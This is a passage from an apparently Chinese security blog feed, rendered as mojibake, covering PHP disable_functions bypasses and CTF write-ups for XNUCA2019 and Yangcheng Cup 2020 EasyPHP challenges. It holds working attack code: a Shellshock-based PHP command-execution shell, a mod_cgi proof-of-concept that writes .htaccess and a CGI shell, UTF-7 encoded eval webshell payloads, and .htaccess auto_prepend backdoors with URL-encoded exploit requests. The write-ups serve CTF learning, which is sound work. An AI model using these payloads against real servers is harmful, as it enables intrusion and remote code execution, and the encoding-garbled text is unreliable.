id="æ¡ä»¶-v2"><a class="header-anchor" href="#æ¡ä»¶-v2">ğŸ­</a>æ¡ä»¶</h5><p>Linux æ“ä½œç³»ç»Ÿ <code>putenv()</code>ã€<code>mail()</code>æˆ–<code>error_log()</code>å‡½æ•°å¯ç”¨ ç›®æ ‡ç³»ç»Ÿçš„<code>/bin/bash</code>å­˜åœ¨<code>CVE-2014-6271</code>æ¼æ´ <code>/bin/sh -&gt; /bin/bash</code>sh é»˜è®¤çš„ shell æ˜¯ bash</p><h5 id="åŸç†-v2"><a class="header-anchor" href="#åŸç†-v2">ğŸ­</a>åŸç†</h5><p>Bashä½¿ç”¨çš„ç¯å¢ƒå˜é‡æ˜¯é€šè¿‡å‡½æ•°åç§°æ¥è°ƒç”¨çš„ï¼Œå¯¼è‡´è¯¥æ¼æ´å‡ºç°æ˜¯ä»¥<code>()&#123;</code>å¼€å¤´å®šä¹‰çš„ç¯å¢ƒå˜é‡åœ¨å‘½ä»¤ ENV ä¸­è§£ææˆå‡½æ•°åï¼ŒBashæ‰§è¡Œå¹¶æœªé€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­è§£æå¹¶æ‰§è¡Œshellå‘½ä»¤ã€‚è€Œå…¶æ ¸å¿ƒçš„åŸå› åœ¨äºåœ¨è¾“å…¥çš„è¿‡æ»¤ä¸­æ²¡æœ‰ä¸¥æ ¼é™åˆ¶è¾¹ç•Œï¼Œä¹Ÿæ²¡æœ‰åšå‡ºåˆæ³•åŒ–çš„å‚æ•°åˆ¤æ–­ã€‚ä¸€èˆ¬å‡½æ•°ä½“å†…çš„ä»£ç ä¸ä¼šè¢«æ‰§è¡Œï¼Œä½†è¯¥æ¼æ´ä¼šé”™è¯¯çš„å°†â€{}â€èŠ±æ‹¬å·å¤–çš„å‘½ä»¤è¿›è¡Œæ‰§è¡Œã€‚PHPé‡Œçš„æŸäº›å‡½æ•°ï¼ˆä¾‹å¦‚ï¼šmail()ã€imap_mail()ï¼‰èƒ½è°ƒç”¨popenæˆ–å…¶ä»–èƒ½å¤Ÿæ´¾ç”Ÿbashå­è¿›ç¨‹çš„å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡è¿™äº›å‡½æ•°æ¥è§¦å‘ç ´å£³æ¼æ´(CVE-2014-6271)æ‰§è¡Œå‘½ä»¤ã€‚</p><h5 id="åˆ©ç”¨"><a class="header-anchor" href="#åˆ©ç”¨">ğŸ­</a>åˆ©ç”¨</h5><p>èšå‰‘ç»ˆç«¯æˆ–æ‰‹åŠ¨åˆ©ç”¨ï¼š</p><p>åœ¨æœ‰æƒé™çš„ç›®å½•ä¸­ï¼ˆ/var/tmpï¼‰ä¸Šä¼ ä»¥ä¸‹åˆ©ç”¨è„šæœ¬ï¼š</p><pre><code class="hljs javascript">&lt;?php <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shellshock</span>(<span class="hljs-params">$cmd</span>) </span>&#123; <span class="hljs-comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span>   $tmp = tempnam(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>);    putenv(<span class="hljs-string">&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;</span>);    error_log(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);   $output = @file_get_contents($tmp);    @unlink($tmp);    <span class="hljs-keyword">if</span>($output != <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">return</span> $output;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No output, or not vuln.&quot;</span>; &#125; echo shellshock($_REQUEST[<span class="hljs-string">&quot;cmd&quot;</span>]); ?&gt;</code></pre><p>åŒ…å«è¯¥è„šæœ¬ï¼Œä¼ å‚å³å¯ã€‚</p><h4 id="åˆ©ç”¨-Apache-Mod-CGI"><a class="header-anchor" href="#åˆ©ç”¨-Apache-Mod-CGI">ğŸ­</a>åˆ©ç”¨ Apache Mod CGI</h4><h5 id="æ¡ä»¶-v3"><a class="header-anchor" href="#æ¡ä»¶-v3">ğŸ­</a>æ¡ä»¶</h5><p>Linux æ“ä½œç³»ç»Ÿ Apache + PHP (apache ä½¿ç”¨ apache_mod_php) Apache å¼€å¯äº†<code>cgi</code>ã€<code>rewrite</code> Web ç›®å½•ç»™äº†<code>AllowOverride</code>æƒé™ å½“å‰ç›®å½•å¯å†™</p><h5 id="åŸç†-v3"><a class="header-anchor" href="#åŸç†-v3">ğŸ­</a>åŸç†</h5><p>æ—©æœŸçš„WebæœåŠ¡å™¨ï¼Œåªèƒ½å“åº”æµè§ˆå™¨å‘æ¥çš„HTTPé™æ€èµ„æºçš„è¯·æ±‚ï¼Œå¹¶å°†å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„é™æ€èµ„æºè¿”å›ç»™æµè§ˆå™¨ã€‚ä¹‹åå‡ºç°äº†åŠ¨æ€æŠ€æœ¯ï¼Œä½†æ˜¯WebæœåŠ¡å™¨ä¸èƒ½ç›´æ¥è¿è¡ŒåŠ¨æ€è„šæœ¬ï¼Œä¸ºäº†è§£å†³WebæœåŠ¡å™¨ä¸å¤–éƒ¨åº”ç”¨ç¨‹åºï¼ˆCGIç¨‹åºï¼‰ä¹‹é—´æ•°æ®äº’é€šå°±å‡ºç°äº†CGIï¼ˆCommon Gateway Interfaceï¼‰é€šç”¨ç½‘å…³æ¥å£ã€‚</p><p>å½“é‡åˆ°åŠ¨æ€è„šæœ¬è¯·æ±‚æ—¶ï¼ŒWebæœåŠ¡å™¨ä¸»è¿›ç¨‹å°±ä¼šForkåˆ›å»ºå‡ºä¸€ä¸ªæ–°çš„è¿›ç¨‹æ¥å¯åŠ¨CGIç¨‹åºï¼Œè¿è¡Œå¤–éƒ¨Cç¨‹åºæˆ–Perlã€PHPè„šæœ¬ç­‰ï¼Œä¹Ÿå°±æ˜¯å°†åŠ¨æ€è„šæœ¬äº¤ç»™CGIç¨‹åºæ¥å¤„ç†ã€‚å¯åŠ¨CGIç¨‹åºéœ€è¦ä¸€ä¸ªè¿‡ç¨‹ï¼Œå¦‚è¯»å–é…ç½®æ–‡ä»¶ã€åŠ è½½æ‰©å±•ç­‰ã€‚å½“CGIç¨‹åºå¯åŠ¨åä¼šå»è§£æåŠ¨æ€è„šæœ¬ï¼Œç„¶åå°†ç»“æœè¿”å›ç»™WebæœåŠ¡å™¨ï¼Œæœ€åç”±WebæœåŠ¡å™¨å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œä¹‹å‰Forkå‡ºæ¥çš„è¿›ç¨‹ä¹Ÿéšä¹‹å…³é—­ã€‚è¿™æ ·ï¼Œæ¯æ¬¡ç”¨æˆ·è¯·æ±‚åŠ¨æ€è„šæœ¬ï¼ŒWebæœåŠ¡å™¨éƒ½è¦é‡æ–°Forkåˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹å»å¯åŠ¨CGIç¨‹åºï¼Œç”±CGIç¨‹åºæ¥å¤„ç†åŠ¨æ€è„šæœ¬ï¼Œå¤„ç†å®Œæˆåè¿›ç¨‹éšä¹‹å…³é—­ï¼Œæ•ˆç‡å¾ˆä½ã€‚è€Œå¯¹äºMod CGIï¼ŒWebæœåŠ¡å™¨å¯ä»¥å†…ç½®Perlè§£é‡Šå™¨æˆ–PHPè§£é‡Šå™¨ã€‚ç›¸å½“äºWebæœåŠ¡å™¨å¯åŠ¨çš„æ—¶å°±å¯åŠ¨ç›¸åº”æ¨¡å—ã€‚å½“æœ‰æ–°çš„åŠ¨æ€è¯·æ±‚è¿›æ¥æ—¶ï¼ŒWebæœåŠ¡å™¨èƒ½è‡ªå·±è§£æè¿™äº›åŠ¨æ€è„šæœ¬ã€‚</p><p>ä»»ä½•å…·æœ‰MIMEç±»å‹application/x-httpd-cgiæˆ–è€…è¢«cgi-scriptå¤„ç†å™¨å¤„ç†çš„æ–‡ä»¶éƒ½å°†è¢«ä½œä¸ºCGIè„šæœ¬å¯¹å¾…å¹¶ç”±æœåŠ¡å™¨è¿è¡Œï¼Œå®ƒçš„è¾“å‡ºå°†è¢«è¿”å›ç»™å®¢æˆ·ç«¯ã€‚å¯ä»¥é€šè¿‡ä¸¤ç§é€”å¾„ä½¿æ–‡ä»¶æˆä¸ºCGIè„šæœ¬ï¼š</p><ul><li>æ–‡ä»¶å…·æœ‰å·²ç”±AddTypeæŒ‡ä»¤å®šä¹‰çš„æ‰©å±•å</li><li>æ–‡ä»¶ä½äºScriptAliasç›®å½•ä¸­</li></ul><p>Apacheåœ¨é…ç½®å¼€å¯CGIåå¯ä»¥ç”¨ScriptAliasæŒ‡ä»¤æŒ‡å®šä¸€ä¸ªç›®å½•ï¼ŒæŒ‡å®šçš„ç›®å½•ä¸‹é¢ä¾¿å¯ä»¥å­˜æ”¾å¯æ‰§è¡Œçš„CGIç¨‹åºã€‚è‹¥æ˜¯æƒ³ä¸´æ—¶å…è®¸ä¸€ä¸ªç›®å½•å¯ä»¥æ‰§è¡ŒCGIç¨‹åºå¹¶ä¸”ä½¿å¾—æœåŠ¡å™¨å°†è‡ªå®šä¹‰çš„åç¼€è§£æä¸ºCGIç¨‹åºæ‰§è¡Œï¼Œåˆ™å¯ä»¥åœ¨ç›®çš„ç›®å½•ä¸‹ä½¿ç”¨htaccessæ–‡ä»¶è¿›è¡Œé…ç½®ï¼Œå¦‚ä¸‹ï¼š</p><pre><code class="hljs javascript">Options +ExecCGIAddHandler cgi-script .xxx</code></pre><p>è¿™æ ·å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰çš„.xxxæ–‡ä»¶ä¼šå½“åšCGIç¨‹åºæ‰§è¡Œã€‚æ•…æˆ‘ä»¬å¯ä»¥åˆ©ç”¨CGIæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ç»•è¿‡disable_functions</p><h5 id="åˆ©ç”¨-v2"><a class="header-anchor" href="#åˆ©ç”¨-v2">ğŸ­</a>åˆ©ç”¨</h5><p>æ­å»ºä¸ª <a href="https://github.com/AntSwordProject/AntSword-Labs">AntSword-Labs</a> é¡¹ç›®æ¥æµ‹è¯•</p><p><img src="/2021/08/13/ff/7.png" alt="7"></p><p>è¿æ¥åç»ˆç«¯æ— æ³•æ‰§è¡Œï¼š</p><p><img src="/2021/08/13/ff/8.png" alt="8"></p><p>ç›®æ ‡ä¸»æœºå¼€å¯äº†CGIï¼ŒWebç›®å½•ä¸‹æœ‰å†™å…¥çš„æƒé™ã€‚æˆ‘ä»¬å¯ä»¥ä¸Šä¼ åˆ›å»º .htaccess ï¼š</p><pre><code class="hljs gradle"><span class="hljs-keyword">Options</span> +ExecCGIAddHandler cgi-script .<span class="hljs-keyword">ant</span></code></pre><p>shell.ant:</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><span class="hljs-built_in">echo</span> Content-type: text/html<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-built_in">echo</span>&amp;&amp;id</code></pre><p>æ³¨ï¼šlinuxä¸­CGIæ¯”è¾ƒä¸¥æ ¼ï¼Œä¸Šä¼ åå¯èƒ½ä¼šå‘ç°çŠ¶æ€ç 500ï¼Œæ— æ³•è§£æbashã€‚å› ä¸ºç›®æ ‡ç«™ç‚¹æ˜¯linuxç¯å¢ƒï¼Œè‹¥ç”¨(windowsç­‰)æœ¬åœ°ç¼–è¾‘å™¨ç¼–å†™ä¸Šä¼ æ—¶ç¼–ç ä¸ä¸€è‡´å¯¼è‡´æ— æ³•è§£æï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨linuxç¯å¢ƒä¸­ç¼–å†™å¹¶å¯¼å‡ºå†ä¸Šä¼ ã€‚</p><p><img src="/2021/08/13/ff/11.png" alt="11"></p><p>æ·»åŠ æƒé™ï¼š</p><pre><code class="hljs gradle">?<span class="hljs-keyword">ant</span>=chmod(<span class="hljs-string">&#x27;shell.ant&#x27;</span>,<span class="hljs-number">0777</span>);</code></pre><p>è®¿é—®ä¾¿å¯æ‰§è¡Œ</p><p><img src="/2021/08/13/ff/12.png" alt="12"></p><p>POC</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$cmd = <span class="hljs-string">&quot;ls /&quot;</span>; <span class="hljs-comment">//command to be executed</span>$shellfile = <span class="hljs-string">&quot;#!/bin/bashn&quot;</span>; <span class="hljs-comment">//using a shellscript</span>$shellfile .= <span class="hljs-string">&quot;echo -ne &quot;</span>Content-Type: text/html\n\n<span class="hljs-string">&quot;n&quot;</span>; <span class="hljs-comment">//header is needed, otherwise a 500 error is thrown when there is output</span>$shellfile .= <span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>; <span class="hljs-comment">//executing $cmd</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkEnabled</span>(<span class="hljs-params">$text,$condition,$yes,$no</span>) //<span class="hljs-title">this</span> <span class="hljs-title">surely</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">shorter</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$text</span>: &quot;</span> . ($condition ? $yes : $no) . <span class="hljs-string">&quot;&lt;br&gt;n&quot;</span>;&#125;<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;checked&#x27;</span>]))&#123;    @file_put_contents(<span class="hljs-string">&#x27;.htaccess&#x27;</span>, <span class="hljs-string">&quot;nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); <span class="hljs-comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span>    header(<span class="hljs-string">&#x27;Location: &#x27;</span> . $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] . <span class="hljs-string">&#x27;?checked=true&#x27;</span>); <span class="hljs-comment">//execute the script again to see if the htaccess test worked</span>&#125;<span class="hljs-keyword">else</span>&#123;    $modcgi = in_array(<span class="hljs-string">&#x27;mod_cgi&#x27;</span>, apache_get_modules()); <span class="hljs-comment">// mod_cgi enabled?</span>    $writable = is_writable(<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">//current dir writable?</span>    $htaccess = !<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&#x27;HTACCESS&#x27;</span>]); <span class="hljs-comment">//htaccess enabled?</span>        checkEnabled(<span class="hljs-string">&quot;Mod-Cgi enabled&quot;</span>,$modcgi,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);        checkEnabled(<span class="hljs-string">&quot;Is writable&quot;</span>,$writable,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);        checkEnabled(<span class="hljs-string">&quot;htaccess working&quot;</span>,$htaccess,<span class="hljs-string">&quot;Yes&quot;</span>,<span class="hljs-string">&quot;No&quot;</span>);    <span class="hljs-keyword">if</span>(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))    &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error. All of the above must be true for the script to work!&quot;</span>; <span class="hljs-comment">//abort if not</span>    &#125;    <span class="hljs-keyword">else</span>    &#123;        checkEnabled(<span class="hljs-string">&quot;Backing up .htaccess&quot;</span>,copy(<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.htaccess.bak&quot;</span>),<span class="hljs-string">&quot;Suceeded! Saved in .htaccess.bak&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//make a backup, cause you never know.</span>        checkEnabled(<span class="hljs-string">&quot;Write .htaccess file&quot;</span>,file_put_contents(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,<span class="hljs-string">&quot;Options +ExecCGInAddHandler cgi-script .dizzle&quot;</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//.dizzle is a nice extension</span>        checkEnabled(<span class="hljs-string">&quot;Write shell file&quot;</span>,file_put_contents(<span class="hljs-string">&#x27;shell.dizzle&#x27;</span>,$shellfile),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//write the file</span>        checkEnabled(<span class="hljs-string">&quot;Chmod 777&quot;</span>,chmod(<span class="hljs-string">&quot;shell.dizzle&quot;</span>,<span class="hljs-number">0777</span>),<span class="hljs-string">&quot;Succeeded!&quot;</span>,<span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//rwx</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Executing the script now. Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style = &#x27;display:none;&#x27;&gt;&quot;</span>; <span class="hljs-comment">//call the script</span>    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ä¹Ÿå¯ç”¨èšå‰‘æ’ä»¶</p><p><img src="/2021/08/13/ff/10.png" alt="10"></p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buuï¼ˆå…«ï¼‰</title>
    <link href="/2021/08/11/ffi/"/>
    <url>/2021/08/11/ffi/</url>
    
    <content type="html"><![CDATA[<h1>[XNUCA2019Qualifier]EasyPHP</h1><h4 id="åˆ†ææºç "><a class="header-anchor" href="#åˆ†ææºç ">ğŸ­</a>åˆ†ææºç </h4><p><img src="/2021/08/11/ffi/2.png" alt="2"></p><p>é¢˜ç›®æœåŠ¡å™¨ä¸­é—´ä»¶ä¸º Apacheï¼Œå› æ­¤å¯ä»¥ä¼  .htaceess åˆ©ç”¨è‡ªå®šä¹‰é”™è¯¯æ–‡ä»¶å†™Webshellã€‚</p><h5 id="ä½¿-htaccess-ç”Ÿæ•ˆ"><a class="header-anchor" href="#ä½¿-htaccess-ç”Ÿæ•ˆ">ğŸ­</a>ä½¿ .htaccess ç”Ÿæ•ˆ</h5><p>æˆ‘ä»¬å†™å…¥çš„å†…å®¹ä¼šè¢«è‡ªåŠ¨åœ¨æœ«å°¾åŠ ä¸Šâ€œ\nJust one chanceâ€ï¼Œä¼šä½¿ä¸Šä¼ çš„.htaccessæ–‡ä»¶ä¸ç”Ÿæ•ˆï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ <code>\</code> çš„æ–¹å¼å°†æ¢è¡Œç¬¦è½¬ä¹‰æˆæ™®é€šå­—ç¬¦ï¼Œç„¶åç”¨ <code>#</code> æ¥æ³¨é‡Šå•è¡Œï¼š</p><pre><code class="hljs javascript">......# \\nJust one chance</code></pre><h5 id="include-path"><a class="header-anchor" href="#include-path">ğŸ­</a>include_path</h5><p>åœ¨é¢˜ç›®çš„ä»£ç ä¸­æœ‰ä¸€å¤„ <code>include_once(&quot;fl3g.php&quot;);</code>ï¼Œä½†æ˜¯å½“æˆ‘ä»¬è®¿é—®fl3g.phpæ–‡ä»¶æ—¶å´å‘ç°è¯¥æ–‡ä»¶å¹¶ä¸å­˜åœ¨ï¼Œè¿™é‡Œä¾¿ç”¨åˆ°äº†php.iniä¸­çš„include_pathé€‰é¡¹ã€‚</p><p>include_pathå¯ä»¥ç”¨æ¥è®¾ç½®include()æˆ–require()å‡½æ•°åŒ…å«æ–‡ä»¶çš„å‚è€ƒç›®å½•è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯è¯´å½“ä½¿ç”¨include()æˆ–require()å‡½æ•°åŒ…å«æ–‡ä»¶çš„æ—¶å€™ï¼Œç¨‹åºé¦–å…ˆä»¥include_pathè®¾ç½®çš„è·¯å¾„ä½œä¸ºå‚è€ƒç‚¹å»æ‰¾æ–‡ä»¶ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™ä»¥ç¨‹åºè‡ªèº«æ‰€åœ¨çš„è·¯å¾„ä¸ºå‚è€ƒç‚¹å»æ‰¾æ‰€è¦çš„æ–‡ä»¶ï¼Œå¦‚æœéƒ½æ‰¾ä¸åˆ°ï¼Œåˆ™å‡ºé”™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹å®ƒæ¥æ§åˆ¶includeçš„è·¯å¾„ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿåœ¨å…¶å®ƒç›®å½•å†™å…¥åŒåçš„fl3g.phpè®©å…¶åŒ…å«ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿgetshellï¼Œå¹¶ä¸”å¯ä»¥ä½¿fl3g.phpæ–‡ä»¶ä¸è¢«åˆ é™¤ã€‚</p><h5 id="æŒ‡å®šç›®å½•å†™æ–‡ä»¶ï¼ˆerror-logï¼‰"><a class="header-anchor" href="#æŒ‡å®šç›®å½•å†™æ–‡ä»¶ï¼ˆerror-logï¼‰">ğŸ­</a>æŒ‡å®šç›®å½•å†™æ–‡ä»¶ï¼ˆerror_logï¼‰</h5><p>å‰é¢æˆ‘ä»¬å·²ç»äº†è§£äº†ï¼Œerror_log å¯ä»¥å°† PHP è¿è¡ŒæŠ¥é”™çš„è®°å½•å†™åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹æˆ‘ä»¬å¯ä»¥å†™Webshellã€‚ä½†æ˜¯å¦‚ä½•è§¦å‘æŠ¥é”™å‘¢ï¼Ÿè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä»£ç ä¸­å†™äº†ä¸€å¤„ä¸å­˜åœ¨çš„fl3g.phpçš„åŸå› ã€‚æˆ‘ä»¬å¯ä»¥å°†include_pathçš„å†…å®¹è®¾ç½®æˆpayloadçš„å†…å®¹ï¼Œè¿™æ—¶è®¿é—®é¡µé¢ï¼Œé¡µé¢å°è¯•å°† payload ä½œä¸ºä¸€ä¸ªè·¯å¾„å»è®¿é—®æ—¶å°±ä¼šå› ä¸ºæ‰¾ä¸åˆ°fl3g.phpè€ŒæŠ¥é”™ï¼Œå¹¶å°†æŠ¥é”™è®°å½•åœ¨æŒ‡å®šçš„é”™è¯¯æ–‡ä»¶ä¸­ã€‚</p><p>ä½†æ˜¯å‰é¢ä¹Ÿè¯´äº†ï¼Œå½“æˆ‘ä»¬ä¼ é€’ PHP çš„ payload æ—¶ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ è¿‡å»çš„å†…å®¹ä¼šç»è¿‡ html ç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨ UTF-7 æ¥ç»•è¿‡ï¼š</p><pre><code class="hljs javascript">php_value include_path &quot;+ADw?php eval(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4-&quot;php_value error_log /tmp/fl3g.php# \</code></pre><h4 id="è§£é¢˜"><a class="header-anchor" href="#è§£é¢˜">ğŸ­</a>è§£é¢˜</h4><p>å†™å…¥ .htaccess error_log ç›¸å…³çš„é…ç½®ï¼Œå°† payload å†™å…¥ç›®æ ‡æ–‡ä»¶</p><p>å°†æ„é€ çš„payloadè¿›è¡Œurlç¼–ç å¹¶æ‰§è¡Œ</p><pre><code class="hljs angelscript">/index.php?filename=.htaccess&amp;content=php_value%<span class="hljs-number">20</span>include_path%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>BADw%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>eval(%<span class="hljs-number">2</span>BACQAXw-POST%<span class="hljs-number">2</span>BAFs-whoami%<span class="hljs-number">2</span>BAF0)%<span class="hljs-number">2</span>BADs%<span class="hljs-number">3</span>F%<span class="hljs-number">2</span>BAD4-%<span class="hljs-number">22</span>%<span class="hljs-number">0</span>Aphp_value%<span class="hljs-number">20</span>error_log%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Ffl3g.php%<span class="hljs-number">0</span>A%<span class="hljs-number">23</span>%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>C</code></pre><p>ç„¶åè®¿é—® index.php è§¦å‘æŠ¥é”™ç•™ä¸‹ error_logã€‚å†å†™å…¥ .htaccess æ–°çš„é…ç½®ï¼Œå°† include_path é€‰é¡¹è®¾å®šä¸ºåˆšæ‰ç”Ÿæˆçš„fl3g.phpçš„ç›®å½•,å¹¶é…ç½®è§£æçš„ç¼–ç ä¸º UTF-7ï¼š</p><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> include_path <span class="hljs-string">&quot;/tmp&quot;</span>php_fl\    # è¿™é‡Œä½¿ç”¨\åŠ æ¢è¡Œçš„æ–¹å¼ç»•è¿‡å¯¹<span class="hljs-string">&quot;flag&quot;</span>çš„è¿‡æ»¤, å³php_flag zend.multibyte <span class="hljs-number">1</span>ag zend.multibyte <span class="hljs-number">1</span>php_value zend.script_encoding <span class="hljs-string">&quot;UTF-7&quot;</span># \</code></pre><p>urlç¼–ç åæ‰§è¡Œï¼š</p><pre><code class="hljs angelscript">/index.php?filename=.htaccess&amp;content=php_value%<span class="hljs-number">20</span>include_path%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">22</span>%<span class="hljs-number">0</span>Aphp_fl%<span class="hljs-number">5</span>C%<span class="hljs-number">0</span>Aag%<span class="hljs-number">20</span>zend.multibyte%<span class="hljs-number">201</span>%<span class="hljs-number">0</span>Aphp_value%<span class="hljs-number">20</span>zend.script_encoding%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>UTF<span class="hljs-number">-7</span>%<span class="hljs-number">22</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">23</span>%<span class="hljs-number">20</span>%<span class="hljs-number">5</span>C</code></pre><p>è¯»å–flagï¼š</p><p><img src="/2021/08/11/ffi/3.png" alt="3"></p><p>è§£äºŒï¼šåŒ…å« .htaccess è‡ªèº«çš„æ–¹æ³•Getshell:</p><pre><code class="hljs php-template"><span class="xml">php_value auto_prepend_fi\le &quot;.htaccess&quot;#</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="xml">\</span></code></pre><p>å› ä¸ºåé¢ä¼šæ‹¼æ¥å­—ç¬¦ä¸²ï¼Œ é‡‡ç”¨.htaccessçš„å•è¡Œæ³¨é‡Šç»•è¿‡ # \ï¼Œè¿™é‡Œåæ–œæ æœ¬æ¥å°±æœ‰æ‹¼æ¥ä¸Šä¸‹ä¸¤è¡Œçš„åŠŸèƒ½ï¼Œå› æ­¤è¿™é‡Œæœ¬æ¥å°±å¯ä»¥ç›´æ¥ä½¿ç”¨\æ¥è¿æ¥è¢«è¿‡æ»¤æ‰çš„å…³é”®å­—æ¥å†™å…¥.htaccess</p><img src="/2021/08/11/ffi/7.png" alt="7" style="zoom:50%;"><p>è§£ä¸‰ï¼šæ­£åˆ™å›æœ”ç»•è¿‡æ­£åˆ™åŒ¹é…</p><pre><code class="hljs angelscript">php_value pcre.backtrack_limit <span class="hljs-number">0</span>php_value pcre.jit <span class="hljs-number">0</span></code></pre><p><code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code> è€Œä¸æ˜¯<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0)</code>ï¼Œå› æ­¤å¯ä»¥é€šè¿‡php_value è®¾ç½®æ­£åˆ™å›æœ”æ¬¡æ•°æ¥ä½¿æ­£åˆ™åŒ¹é…çš„ç»“æœè¿”å›ä¸ºfalseè€Œä¸æ˜¯0æˆ–1ï¼Œé»˜è®¤çš„å›æœ”æ¬¡æ•°æ¯”è¾ƒå¤§ï¼Œå¯ä»¥è®¾æˆ0ï¼Œé‚£ä¹ˆå½“è¶…è¿‡æ­¤æ¬¡æ•°ä»¥åå°†è¿”å›falseã€‚//ç»•è¿‡filenameçš„è¿‡æ»¤ç›´æ¥å†™shell</p><p>payload</p><pre><code class="hljs php-template"><span class="xml">php_value pcre.backtrack_limit    0</span><span class="xml">php_value auto_append_file    &quot;.htaccess&quot;</span><span class="xml">php_value pcre.jit   0</span><span class="xml">#aa</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">\</span></code></pre><p>filename=php://filter/write=convert.base64-decode/resource=.htaccess// contentç»•è¿‡stristrï¼Œç„¶ågetshellã€‚</p><h1>[ç¾ŠåŸæ¯ 2020]Easyphp</h1><p>é¢˜ç›®ç»™äº†æºç ï¼Œè·Ÿ[XNUCA2019Qualifier]EasyPHPä¸€æ ·ï¼Œåªä¸è¿‡å°‘äº†<code>include_once(&quot;fl3g.php&quot;);</code>ï¼Œå°†payloadä¸€çš„include_pathå»æ‰ï¼Œå°±å¯ä»¥ç”¨åœ¨è¿™ä¸€é¢˜ï¼Œpayload2,3åŒç†å¯ç”¨</p><p><img src="/2021/08/11/ffi/6.png" alt="6"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥ä¼ ä¸€å¥è¯ï¼Œå› ä¸ºè¿™é¢˜æ²¡æœ‰include_once</p><h1>[ç¾ŠåŸæ¯ 